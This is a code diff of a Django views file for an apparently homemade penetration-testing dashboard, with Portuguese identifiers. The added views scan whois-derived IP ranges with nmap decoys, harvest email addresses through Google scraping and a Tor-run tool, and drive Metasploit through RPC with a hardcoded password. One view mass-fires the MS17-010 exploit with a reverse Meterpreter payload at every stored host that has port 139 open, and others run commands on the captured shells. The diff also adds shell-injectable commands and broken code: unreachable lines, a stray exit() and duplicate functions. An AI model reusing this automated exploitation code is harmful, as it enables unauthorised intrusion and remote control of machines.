@@ -25,8 +25,10 @@ import os
 
 # Create your views here
 #from core.models import Produto
+from pymetasploit3.msfrpc import MsfRpcClient
+
 from core.models import Scan, IP, Rede, FfufComandos, Diretorios, Porta, CVE_IP, CVE, SistemaOperacional, Sistema_IP, \
-    Pentest_Rede, WhatWebComandos, WhatWeb, WhatWebIP
+    Pentest_Rede, WhatWebComandos, WhatWeb, WhatWebIP, inetNum, dominioinetNum, Dominio, spfDominio, Emails
 
 
 def login_user(request):
@@ -108,8 +110,8 @@ def inicio(request,rede):
         print(diretorios)
 
         redes = Pentest_Rede.objects.filter(usuario=usuario)
-
-        dados = {'ips': ips_ativos,'ips_desligados':ips_desligados,'diretorios':diretorios,'rede':rede,'redes':redes}
+        whatwebTotal =  WhatWebIP.objects.filter(ip__rede = rede_objeto)
+        dados = {'ips': ips_ativos,'ips_desligados':ips_desligados,'diretorios':diretorios,'rede':rede,'redes':redes,'whatwebTotal':whatwebTotal,'portas':Porta.objects.all()}
         return render(request,'inicio.html',dados)
 
 
@@ -138,6 +140,8 @@ def scanOpcoes(request):
         Pentest_Rede.objects.get(rede=Rede.objects.get(id=rede_vpn),usuario=User.objects.get(id=request.user.id))
     except:
         return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")
+    vpn = Rede.objects.get(id=rede_vpn)
+
     versao = request.POST.get('versao')
     tipo = request.POST.get('tipo')
     pn = request.POST.get('pn')
@@ -237,14 +241,15 @@ def verificarArquivoXml(dataAgora,usuario):
     except:
         print("alo")
     #print(res)
-    try:
-        lerArquivoXml(dataAgora,usuario)
-        scan = Scan.objects.get(dataAgora = dataAgora,
-                                usuario = User.objects.get(username= usuario))
-        scan.feito = 1
-        scan.save()
-    except:
-        pass
+
+    lerArquivoXml(dataAgora,usuario)
+    scan = Scan.objects.get(dataAgora = dataAgora,
+                                    usuario = User.objects.get(username= usuario))
+    scan.feito = 1
+    scan.save()
+
+
+
 
 
 
@@ -352,27 +357,16 @@ def lerArquivoXml(dataAgora,usuario):
     for i in range(len(ip)):
         print(ip[i])
         print("testeeeee")
-        try:
-            ipObjeto = IP.objects.get(ip=str(ip[i]),rede=rede_vpn,usuario=User.objects.get(username=usuario))
-            ipObjeto.ativo = 1
-            if True == ipaddress.ip_address(ip[i]).is_private:
+        continue
+        ipObjeto = IP.objects.filter(ip=str(ip[i]),rede=rede_vpn,usuario=User.objects.get(username=usuario))
+
+        exit()
+        ipObjeto.ativo = 1
+        if True == ipaddress.ip_address(ip[i]).is_private:
                 ipObjeto.redelocal = 1
 
-            ipObjeto.save()
-        except:
-            if True == ipaddress.ip_address(ip[i]).is_private:
-                redelocal = 1
-            else:
-                redelocal = 0
+        ipObjeto.save()
 
-
-            ipObjeto = IP.objects.create(ip=IP.objects.get(ip = str(ip[i]),rede=rede_vpn),
-                                             usuario=User.objects.get(username=usuario),
-                                             ativo=1,
-                                             redelocal = redelocal,
-                                         rede = Rede.objects.get(id=1)
-
-                                             )
 
         contador = - 1
         for portaVariavel in portas[i]:
@@ -701,3 +695,507 @@ def verificarArquivoWhatWeb(arquivo,ip):
                                           ip=ip)
 
                 print(c)
+
+
+
+
+def blocoIP(ip):
+    dataAgora = dataAtual()
+    res = subprocess.check_output(' whois ' + str(ip)  + ' | grep "inetnum" | cut -d ":" -f2 |  cut -d "-" -f1',
+                                  shell=True)
+    print(res.decode("UTF-8").replace(' ',''))
+    ipminimo = res.decode("UTF-8").replace(' ','')
+
+    res = subprocess.check_output(' whois ' + str(ip) + ' | grep "inetnum" | cut -d ":" -f2 |  cut -d "-" -f2',
+                                  shell=True)
+    print(res.decode("UTF-8").replace(' ',''))
+    ipmaximo = res.decode("UTF-8").replace(' ','')
+
+    ipminimo = ipminimo.replace('\n', '')
+    ipmaximo = ipmaximo.replace('\n', '')
+    return ipminimo,ipmaximo
+
+
+def scanredelocalip(request, ip, vpn):
+
+    try:
+        Pentest_Rede.objects.get(rede=vpn,usuario=User.objects.get(id=request.user.id))
+    except:
+        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")
+
+
+    dataAgora = dataAtual()
+    comando = "sudo nmap -Pn -D RND:20 " + ip + " -oX arquivos/nmap/'"+ str(dataAgora) + str(request.user) + "'.xml &"
+    os.system(comando)
+
+    usuario = User.objects.get(id=request.user.id)
+    ip = verificarSeExisteSeNaoCriar(ip, usuario, vpn)
+
+    Scan.objects.create(ip=ip,
+                        dataAgora=dataAgora,
+                        usuario=User.objects.get(username=request.user),
+                        feito=0,
+                        comando=comando,
+                        )
+
+
+def publicoDominio(request,dominio,rede_vpn):
+    if dominio != "the":
+        dominio = dominio
+    else:
+        dominio = request.POST.get('dominio')
+    vpn = Rede.objects.get(id=rede_vpn)
+
+    res = subprocess.check_output('host -t A '+   str(dominio) + ' | cut -d " " -f4', shell=True)
+    res = res.decode("UTF-8").replace(' ', '')
+    res = res.replace('\n', '')
+
+    print(res)
+    ipminimo, ipmaximo = blocoIP(res)
+    ipminimoVai = ipminimo.replace('\n','')
+    ipmaximoVai = ipmaximo.replace('\n','')
+
+    if ipmaximo == "":
+        pass
+    else:
+            print("etrou")
+
+            print(ipminimo)
+
+            ip = ipaddress.IPv4Address(ipminimoVai)
+            print(ip)
+            print("aquiiiii")
+            print(ipmaximoVai)
+            while ipaddress.IPv4Address(ip) != ipaddress.IPv4Address(ipmaximoVai) + 1:
+                scanredelocalip(request, str(ip),vpn)
+
+                try:
+                    ip2 = IP.objects.get(ip=str(ip),rede=vpn)
+                except:
+                    if ipaddress.ip_address(ip).is_private == True:
+                        redelocal = 1
+                    else:
+                        redelocal = 0
+                    ip2 = IP.objects.create(ip=str(ip),
+                                                 usuario=User(request.user.id),
+                                                 ativo=0,
+                                            redelocal = redelocal,
+                                             rede = vpn
+                                          )
+                ip = ip + 1
+
+    ipminimo = ipminimoVai
+    ipmaximo = ipmaximoVai
+
+    ipObjetomin = IP.objects.get(ip=ipminimo,rede=vpn)
+    ipObjetomax = IP.objects.get(ip=ipmaximo,rede=vpn)
+
+
+    try:
+        Dominio.objects.get(nome=dominio,ip__rede=vpn).nome
+
+    except:
+        scanredelocalip(request.user, res, vpn)
+        ipObjeto = IP.objects.get(ip = res,rede=vpn)
+
+        Dominio.objects.create(nome = dominio,
+                                ip = ipObjeto,
+                              )
+
+
+    try:
+
+
+        inet = inetNum.objects.get(ipMinimo_ip = ipObjetomin, ipMaximo_ip=ipObjetomax)
+    except:
+        inet = inetNum.objects.create(ipMinimo_ip=ipObjetomin, ipMaximo_ip=ipObjetomax)
+
+    try:
+        dominioinetNum.objects.get(Dominio = Dominio.objects.get(nome = dominio,ip__rede=vpn))
+    except:
+        dominioinetNum.objects.create(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn),bloco=inet)
+
+    #Dominio = models.ForeignKey(Dominio, models.CASCADE)
+    #bloco = models.ForeignKey(inetNum, models.CASCADE)
+
+
+
+    try:
+        Dominio.objects.get(nome=dominio,ip__rede=vpn).nome
+
+    except:
+        scanredelocalip(request.user, res, vpn)
+        ipObjeto = IP.objects.get(ip = res,rede=vpn)
+
+        Dominio.objects.create(nome = dominio,
+                                ip = ipObjeto,
+                              )
+    try:
+        spf = spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
+        vulneravelSpf = spf.vulneravel
+        descricaoSpf  = spf.descricao
+    except:
+        vulneravelSpf = "Ainda não sabemos"
+        descricaoSpf = "Não tem descrição"
+
+    try:
+        emails = Emails.objects.filter(Dominio = Dominio.objects.get(nome=dominio,ip__rede=vpn))
+
+        res2 = subprocess.check_output("sudo service tor start", shell=True)
+        try:
+            res2 = subprocess.check_output("sudo python3 /opt/karma/karma-master/bin/karma.py target -o arquivos/publico/email/"+str(dominio), shell=True)
+            res2 = res2.decode("UTF-8").replace(' ', '')
+            res2 = res2.replace('\n', '')
+            print(res2)
+        except:
+            res2 = "Karma não encontrado"
+
+    except:
+        emails = ""
+    dados  = { "dominio": Dominio.objects.get(nome = dominio,ip__rede=vpn).nome,
+               "ip":IP.objects.get(ip = res).ip,
+               "spf": vulneravelSpf,
+               "descricao": descricaoSpf,
+               "emails": emails,
+               "scans": verificarScan()
+               }
+
+    return render(request,'dominio.html',dados)
+
+
+
+def SPF(request,dominio,rede_vpn):
+    dataAgora = dataAtual()
+    vpn = Rede.objects.get(id=rede_vpn)
+
+    try:
+        Pentest_Rede.objects.get(rede=Rede.objects.get(id=rede_vpn),usuario=User.objects.get(id=request.user.id))
+    except:
+        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")
+    res = subprocess.check_output("host -t txt " + str(dominio) + " | grep '?all'", shell=True)
+    res = res.decode("UTF-8").replace(' ','')
+    print(res)
+    print("aqui0")
+    try:
+        spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
+    except:
+
+        if res == "":
+            res = subprocess.check_output("host -t txt " + str(dominio) + " | grep '~all'", shell=True)
+            res = res.decode("UTF-8").replace(' ', '')
+            print(res)
+            print("aqui")
+
+            if res == "":
+                print(res)
+                print("aqui3")
+
+                try:
+                    spf = spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
+                    spf.vulneravel = 2
+                    spf.descricao = res
+                    spf.save()
+                except:
+                    spfDominio.objects.create(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn),
+                                          vulneravel=2,
+                                          descricao=res)
+
+
+
+            else:
+                print(res)
+                print("aqui4")
+                try:
+                    spf = spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
+                    spf.vulneravel = 1
+                    spf.descricao = res
+                    spf.save()
+                except:
+                    spfDominio.objects.create(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn),
+                                              vulneravel=1,
+                                              descricao=res)
+
+
+        else:
+            try:
+                spf = spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
+                spf.vulneravel = 0
+                spf.descricao = res
+                spf.save()
+            except:
+                spfDominio.objects.create(Dominio = Dominio.objects.get(nome=dominio,ip__rede=vpn),
+                                          vulneravel = 0,
+                                          descricao = res)
+        return redirect('/')
+
+def EmailsFuncao(request,dominio,rede_vpn):
+    contador = 0
+    os.system("rm -f arquivos/publico/email/" + str(dominio))
+    try:
+        Pentest_Rede.objects.get(rede=Rede.objects.get(id=rede_vpn),usuario=User.objects.get(id=request.user.id))
+    except:
+        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")
+    vpn = Rede.objects.get(id=rede_vpn)
+    while (contador < 100):
+        os.system("echo 'página" + str(int(contador / 10)) + "' ")
+        os.system('sudo lynx --dump "https://google.com/search?&q=intext:' + str(dominio) + '&start=' + str(
+            contador) + '" | grep "@"' + str(dominio) + '>> arquivos/publico/email/' + str(dominio))
+        contador = contador + 10
+        time.sleep(10)
+
+    LimparEmail(dominio,vpn)
+
+
+    return redirect('/')
+
+def LimparEmail(dominio,vpn):
+    import re
+    ref_arquivo = open("arquivos/publico/email/"+str(dominio), "r")
+
+    m = re.findall(r"\w*@" + str(dominio), ref_arquivo.read())
+    emails = []
+    print(ref_arquivo)
+    for a in m:
+        if a in emails:
+            pass
+        else:
+            if a != "@" + str(dominio):
+                emails.append(a)
+    print(emails)
+    ref_arquivo.close()
+    os.system("rm -f arquivos/publico/email/"+str(dominio))
+    for a in emails:
+
+        try:
+            Emails.objects.get(email = a)
+        except:
+
+            Emails.objects.create(email = a,
+                                  Dominio= Dominio.objects.get(nome=dominio,ip__rede = vpn))
+        os.system("echo '" + str(a) + "' >> arquivos/publico/email/"+str(dominio))
+
+@login_required(login_url='/login/')
+def ligarMetaSploi(request):
+    class Ips:
+        def __init__(self,ip,sessao):
+            self.ip =  ip
+            self.sessao = sessao
+    try:
+        client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)
+    except:
+        os.system('msfrpcd -P Z1rS5DW#9N1e -S')
+    print(client.sessions.list)
+
+    hosts_invadidos = []
+
+
+    for a in client.sessions.list:
+        dicionario = {}
+        c = client.sessions.list
+
+
+        ip = Ips(str(c[str(a)]['session_host']),a)
+        hosts_invadidos.append(ip)
+
+
+
+    """
+    porta_saida = 4444
+    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
+    exploit['RHOSTS'] = '172.16.1.233'
+    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
+    payload['LHOST'] = '172.20.1.103'
+    payload['LPORT'] = porta_saida
+    porta_saida = porta_saida + 1
+    print(exploit.execute(payload=payload))
+    """
+    dados = {
+        "hosts": hosts_invadidos,
+    }
+    return render(request,'shell.html',dados)
+
+
+
+@login_required(login_url='/login/')
+def procurarExploits(request):
+    class Ips:
+        def __init__(self,ip,sessao):
+            self.ip =  ip
+            self.sessao = sessao
+    try:
+        client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)
+    except:
+        os.system('msfrpcd -P Z1rS5DW#9N1e -S')
+
+    exploits=  client.modules.exploits
+    return render(request,'exploits.html',{'exploits':exploits})
+
+@login_required(login_url='/login/')
+def exploit3(request,sessao):
+
+    try:
+        client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)
+    except:
+        os.system('msfrpcd -P Z1rS5DW#9N1e -S')
+
+    client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)
+    comando = request.POST.get('comando')
+
+    shell = client.sessions.session(sessao)
+    if comando == None:
+        comando = 'ipconfig'
+    shell.write(comando)
+    print(comando)
+    time.sleep(5)
+    dados = {"saida": str(shell.read()),
+             "sessao": sessao}
+    return render(request,'shell.html',dados)
+
+
+
+@login_required(login_url='/login/')
+def exploit(request):
+    client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)
+    ip_entrou = []
+    porta_saida = 9998
+
+    for ip in IP.objects.all():
+        validar = 0
+        for a in client.sessions.list:
+            c = client.sessions.list
+
+            if str(ip.ip) == str(c[str(a)]['session_host']):
+                validar = 1
+        validando_porta = 0
+        if validar == 0:
+            for porta in Porta.objects.filter(ip=ip):
+                #print(porta.porta)
+                if int(porta.porta) == 139:
+                    validando_porta=1
+            if validando_porta == 1:
+                    client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)
+
+                    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
+                    exploit['RHOSTS'] = str(ip.ip)
+                    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
+                    payload['LHOST'] = '172.20.1.184'
+                    payload['LPORT'] = porta_saida
+                    #print(ip.ip)
+                    porta_saida = porta_saida + 1
+                    exploit.execute(payload=payload)
+                    print("IP: " + str(ip.ip) + " porta: " + str(porta_saida))
+                    #print(client.sessions.list)
+                    #print(type(client.sessions.list))
+
+                    for aa in client.sessions.list:
+                        cc = client.sessions.list
+                        print("sessões")
+                        print(cc[str(aa)]['session_host'])
+
+        #print(a['session_host'])
+    #print(client.consoles.)
+    #print(client.module)
+    #exploit = client.modules.use('exploit', 'CVE-2017-0143')
+    #print(exploit)
+    """
+    for a in client.modules.exploits:
+        exploit = client.modules.use('exploit', a)
+        print(exploit.options)
+    """
+    #shell = client.sessions.session('1')
+    #shell.write('exit')
+    #print(shell.read())
+    return redirect('/exploit')
+
+
+
+
+@login_required(login_url='/login/')
+def usandoExploit(request):
+    exploit = request.POST.get('exploit')
+
+    class Ips:
+        def __init__(self,ip,sessao):
+            self.ip =  ip
+            self.sessao = sessao
+    try:
+        client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)
+    except:
+        os.system('msfrpcd -P Z1rS5DW#9N1e -S')
+
+    exploits=  client.modules.use('exploit',exploit)
+    exploits_opcao = exploits.options
+    exploits_requerido = exploits.missing_required
+    exploit_payload = exploits.targetpayloads()
+    return render(request,'opcoesExploit.html',{'exploit':exploit,'exploits':exploits.description,'opcoes':exploits_opcao,'obrigatorio':exploits_requerido,'payloads':exploit_payload})
+
+@login_required(login_url='/login/')
+def rodandoExploit(request):
+    pass
+    """
+    client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)
+
+    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
+    exploit['RHOSTS'] = str(ip.ip)
+    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
+    payload['LHOST'] = '172.20.1.184'
+    payload['LPORT'] = porta_saida
+    # print(ip.ip)
+    porta_saida = porta_saida + 1
+
+
+    exploit.execute(payload=payload)
+    """
+@login_required(login_url='/login/')
+def rodandoExploit(request):
+    client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)
+    exploit  = client.modules.use('exploit', request.POST.get('exploit'))
+
+    for requestinho in request.POST:
+        print(requestinho)
+        if requestinho == "exploit":
+            continue
+        elif requestinho == "csrfmiddlewaretoken":
+            continue
+        elif requestinho == "payload":
+            payload = client.modules.use('payload', request.POST.get(requestinho))
+            continue
+        elif requestinho == "LPORT":
+            payload['LPORT'] = request.POST.get(requestinho)
+            continue
+        elif requestinho == "LHOST":
+            payload['LHOST'] = request.POST.get(requestinho)
+            continue
+        else:
+            if request.POST.get(requestinho) == "":
+                continue
+            else:
+                exploit[requestinho]=  request.POST.get(requestinho)
+    payload['LHOST'] = "172.20.1.167"
+    payload['LPORT'] = "443"
+
+    saida = exploit.execute(payload=payload)
+    print(saida)
+    return HttpResponse(saida)
+
+
+@login_required(login_url='/login/')
+def exploit3(request,sessao):
+
+    try:
+        client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)
+    except:
+        os.system('msfrpcd -P Z1rS5DW#9N1e -S')
+
+    client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)
+    comando = request.POST.get('comando')
+
+    shell = client.sessions.session(sessao)
+    if comando == None:
+        comando = 'ipconfig'
+    shell.write(comando)
+    print(comando)
+    time.sleep(5)
+    dados = {"saida": str(shell.read()),
+             "sessao": sessao}
+    return render(request,'shell.html',dados)
